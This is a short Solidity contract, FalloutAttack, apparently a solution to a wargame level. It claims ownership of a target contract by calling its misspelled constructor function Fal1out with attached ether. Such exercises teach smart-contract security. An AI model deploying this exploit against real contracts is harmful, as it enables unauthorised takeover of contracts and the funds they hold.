// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

import "../../interfaces/IFallout.sol";

contract FalloutAttack {
    IFallout target;

    constructor(address _target) {
        target = IFallout(_target);
    }

    function attack() public payable {
        target.Fal1out{value: msg.value}();
    }
}